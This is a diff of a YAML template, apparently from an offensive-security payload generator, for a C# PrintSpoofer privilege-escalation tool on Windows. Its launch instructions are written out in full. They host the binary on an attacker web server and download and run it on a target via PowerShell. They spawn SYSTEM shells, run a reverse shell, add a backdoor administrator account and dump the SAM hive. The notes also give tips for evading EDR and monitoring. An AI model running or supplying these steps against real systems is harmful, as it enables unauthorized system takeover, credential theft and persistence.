@@ -1,20 +1,20 @@
 meta:
-  name: "PrintSpoofer Privilege Escalation (C#)"
+  name: "PrintSpoofer Privilege Escalation (C#)*"
   category: "Privilege Escalation"
   description: |
     Local privilege escalation by stealing SYSTEM token from Windows Print Spooler service.
-    
+
     Features:
     - Named pipe impersonation technique
     - Steals SYSTEM token from Print Spooler
     - Spawns arbitrary process with elevated privileges
     - Works from any user context
     - No exploit required (abuses legitimate Windows functionality)
-    
+
     This technique creates a named pipe and waits for the Print Spooler service
     to connect. Upon connection, it impersonates the service's SYSTEM token and
     uses it to spawn a new process with full privileges.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: "high"
@@ -59,51 +59,72 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
   launch_instructions: |
-    C# PrintSpoofer Privilege Escalation - Launch Instructions
+    # Transfer and Execute
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss {{ binary_path }}"
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    Example - Spawn SYSTEM cmd.exe:
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://YOUR_IP:/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss {{ binary_path }}"
+    ```
+
+    # Example - Spawn SYSTEM cmd.exe
+
+    ```cmd
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\System32\\cmd.exe
+    ```
 
-    Example - Spawn SYSTEM PowerShell:
+    # Example - Spawn SYSTEM PowerShell
+
+    ```cmd
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+    ```
 
-    Example - Execute Reverse Shell:
+    # Example - Execute Reverse Shell
+
+    ```cmd
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss C:\\Windows\\Temp\\reverse.exe
+    ```
 
-    Example - Add Admin User:
+    # Example - Add Admin User
+
+    ```cmd
     {{ output_file }} \\\\.\\pipe\\test\\pipe\\spoolss "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
+    ```
 
-    Verify Elevation:
+    # Verify Elevation
+
+    ```cmd
     whoami
     whoami /priv
-    Should show: NT AUTHORITY\SYSTEM
+    ```
+    Should show: `NT AUTHORITY\SYSTEM`
 
-    Notes:
-    - Binary path: {{ binary_path }} (must be absolute and accessible)
+    # Notes
+
+    - Binary path: `{{ binary_path }}` (must be absolute and accessible)
     - Requires Print Spooler service running (enabled by default: `sc query spooler`)
     - Works from any user privilege level (no UAC bypass needed)
     - Well-known technique - may be detected by EDR
     - Tool waits for Print Spooler connection to named pipe before spawning process as SYSTEM
-    - Pipe name: \\\\.\\pipe\\test\\pipe\\spoolss (can be changed if monitored)
+    - Pipe name: `\\\\.\\pipe\\test\\pipe\\spoolss` (can be changed if monitored)
     - Common use: Spawn interactive SYSTEM shell, dump SAM (`reg save hklm\\sam C:\\Temp\\sam`)
 
-    Troubleshooting:
-    - Print Spooler not running: `sc start spooler` (requires admin)
-    - Service start fails: Check `sc query spooler` and Event Viewer
+    # Troubleshooting
+
+    - **Print Spooler not running:** `sc start spooler` (requires admin)
+    - **Service start fails:** Check `sc query spooler` and Event Viewer
     - Verify binary path correct and executable exists
     - EDR may block this well-known technique
     - Try different pipe names if default is monitored
     - Named pipe creation may trigger Sysmon Event ID 17/18
 
-    Cleanup:
-    On target:
-    $ del {{ output_file }}
+    # Cleanup
 
-    Cleanup:
-
-    After testing, remove the payload:
-    $ Remove-Item {{ output_file }} -Force
+    **On target:**
+    ```cmd
+    del {{ output_file }}
+    ```
